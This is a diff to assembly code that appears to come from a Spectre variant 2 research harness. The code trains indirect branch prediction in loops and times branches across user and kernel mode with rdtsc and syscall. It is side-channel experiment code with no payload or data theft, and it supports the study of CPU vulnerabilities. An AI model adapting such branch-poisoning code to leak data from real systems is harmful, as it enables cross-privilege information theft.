@@ -440,11 +440,11 @@ spectre2_kk:
 .globl spectre2_uk
 spectre2_uk:
     movq $(0x1000+target_aaa-usercode_segment), (0x3000)
-    mov $1024, %r11
-1:  push %r11
+    mov $1024, %r10
+1:  //push %r11
     callq measure_branch
-    pop %r11
-    dec %r11
+    //pop %r10
+    dec %r10
     jnz 1b
 
     push $0
@@ -456,7 +456,6 @@ spectre2_ku:
     movq $(0x1000+target_bbb-usercode_segment), (0x3000)
     callq measure_branch
     push %rax
-
     rdtsc
     syscall
 
@@ -465,26 +464,31 @@ spectre2_uu:
     movq $(0x1000+target_bbb-usercode_segment), (0x3000)
     callq measure_branch
     push %rax
+    rdtsc
+    syscall
 
+.globl spectre2_uu_train
+spectre2_uu_train:
     movq $(0x1000+target_aaa-usercode_segment), (0x3000)
-    mov $1024, %r11
-1:  push %r11
+    mov $1024, %r10
+1:  //push %r11
     callq measure_branch
-    pop %r11
-    dec %r11
+    //pop %r11
+    dec %r10
     jnz 1b
 
+    push $0
     rdtsc
     syscall
 
 .globl spectre2_uu_nosyscall
 spectre2_uu_nosyscall:
     movq $(0x1000+target_aaa-usercode_segment), (0x3000)
-    mov $1024, %r11
-1:  push %r11
+    mov $1024, %r10
+1:  //push %r11
     callq measure_branch
-    pop %r11
-    dec %r11
+    //pop %r11
+    dec %r10
     jnz 1b
 
     movq $(0x1000+target_bbb-usercode_segment), (0x3000)
@@ -560,7 +564,7 @@ time_branch:
 
 .global time_branches_u
 time_branches_u:
-    mov $1024, %r11
+    mov $512, %r11
 1:  push %r11
     callq time_branch
     pop %r11
@@ -574,7 +578,7 @@ time_branches_u:
 
 .global time_branches_k
 time_branches_k:
-    mov $1024, %r11
+    mov $512, %r11
 1:  push %r11
     callq time_branch
     pop %r11
@@ -588,28 +592,31 @@ time_branches_k:
 
 .globl target_aaa
 target_aaa:
-    push %rcx
+//    push %rcx
     mov $3456, %rax
     mov $7654, %rdx
     mov $123456789355, %rcx
     divq %rcx
-    mov $3456, %rax
-    mov $7654, %rdx
-    mov $123456789355, %rcx
     divq %rcx
-    mov $3456, %rax
-    mov $7654, %rdx
-    mov $123456789355, %rcx
     divq %rcx
-    mov $3456, %rax
-    mov $7654, %rdx
-    mov $123456789355, %rcx
     divq %rcx
-    mov $3456, %rax
-    mov $7654, %rdx
-    mov $123456789355, %rcx
     divq %rcx
-    pop %rcx
+//    mov $3456, %rax
+//    mov $7654, %rdx
+//    divq %rcx
+//    mov $3456, %rax
+//    mov $7654, %rdx
+//    mov $123456789355, %rcx
+//    divq %rcx
+//    mov $3456, %rax
+//    mov $7654, %rdx
+//    mov $123456789355, %rcx
+//    divq %rcx
+//    mov $3456, %rax
+//    mov $7654, %rdx
+//    mov $123456789355, %rcx
+//    divq %rcx
+//    pop %rcx
     ret
 
 .globl target_bbb
